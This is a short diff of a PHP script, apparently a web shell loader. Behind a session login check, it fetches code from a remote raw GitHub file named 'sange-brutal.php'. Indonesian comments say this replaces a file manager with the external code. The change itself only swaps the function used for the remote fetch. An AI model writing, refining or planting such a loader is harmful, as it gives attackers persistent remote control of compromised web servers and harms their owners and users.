@@ -4,7 +4,7 @@ session_start();
 if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     // Setelah login, ganti file manager dengan kode eksternal
     $url = "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/sange-brutal.php";
-    $content = file_get_contents($url);
+    $content = fetchContent($url);
 
     if ($content !== false) {
         // Tampilkan kode dari URL eksternal
